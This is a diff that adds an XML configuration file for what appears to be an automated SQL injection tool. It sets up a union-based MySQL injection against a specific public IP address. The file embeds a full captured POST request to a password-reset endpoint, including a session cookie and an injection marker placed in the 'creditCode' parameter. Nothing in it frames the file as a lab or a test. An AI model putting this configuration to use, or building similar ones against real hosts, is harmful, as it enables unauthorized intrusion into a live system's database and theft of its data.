@@ -1,0 +1,81 @@
+<?xml version="1.0"?>
+<Config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <saveConfigpath />
+  <time />
+  <domain>http://114.215.130.13/index.php</domain>
+  <uri />
+  <pname />
+  <testPayload />
+  <port>80</port>
+  <maxTime>5</maxTime>
+  <injectType>Union</injectType>
+  <dbType>MySQL</dbType>
+  <timeOut>10</timeOut>
+  <threadSize>5</threadSize>
+  <reTry>2</reTry>
+  <encoding>自动识别</encoding>
+  <cmd_encoding>UTF-8</cmd_encoding>
+  <request>POST /index.php?a=reset_pw_confirm&amp;c=Public&amp;m= HTTP/1.1
+Host: 114.215.130.13
+Content-Length: 174
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://114.215.130.13
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://114.215.130.13/index.php?a=reset_pw_confirm&amp;c=Public&amp;m=
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=vlahpkolgspvqlr7cg4d1vmo46
+Connection: close
+
+creditCode=1'&lt;Encode&gt;&lt;/Encode&gt;#&amp;email=sample%40email.tst&amp;username=adminn&amp;usertype=4</request>
+  <sencondRequest />
+  <key />
+  <injectHTTPCode>0</injectHTTPCode>
+  <db_encoding>UTF-8</db_encoding>
+  <useCode>false</useCode>
+  <columnsCount>0</columnsCount>
+  <unionFillTemplate />
+  <sencondInject>false</sencondInject>
+  <showColumn>0</showColumn>
+  <reverseKey>false</reverseKey>
+  <keyType>Key</keyType>
+  <isMuStr>true</isMuStr>
+  <is_foward_302>false</is_foward_302>
+  <isOpenInfoLog>true</isOpenInfoLog>
+  <isOpenHTTPLog>true</isOpenHTTPLog>
+  <isAutoCheckUpdate>true</isAutoCheckUpdate>
+  <isSavaConfigWhenClose>true</isSavaConfigWhenClose>
+  <useSSL>false</useSSL>
+  <isOpenURLEncoding>true</isOpenURLEncoding>
+  <redirectDoGet>false</redirectDoGet>
+  <maxClolumns>50</maxClolumns>
+  <urlencodeCount>1</urlencodeCount>
+  <unionFill>1</unionFill>
+  <token_request />
+  <token_startStr />
+  <token_endStr />
+  <readFileEncoding>GBK</readFileEncoding>
+  <showCmdResult>true</showCmdResult>
+  <reaplaceBeforURLEncode>true</reaplaceBeforURLEncode>
+  <inculdeStr>false</inculdeStr>
+  <keyReplace>0</keyReplace>
+  <randIPToHeader />
+  <sendHTTPSleepTime>0</sendHTTPSleepTime>
+  <replaceStrs />
+  <base64Count>0</base64Count>
+  <useBetweenByPass>false</useBetweenByPass>
+  <usehex>false</usehex>
+  <useUnicode>false</useUnicode>
+  <retryKey />
+  <level>0</level>
+  <linkCount>1</linkCount>
+  <maxSpiderCount>10</maxSpiderCount>
+  <maxScanCount>10</maxScanCount>
+  <proxy_mode>0</proxy_mode>
+  <proxy_check_host>www.baidu.com</proxy_check_host>
+  <proxy_check_port>80</proxy_check_port>
+  <proxy_check_Keys>百度一下，你就知道</proxy_check_Keys>
+</Config>
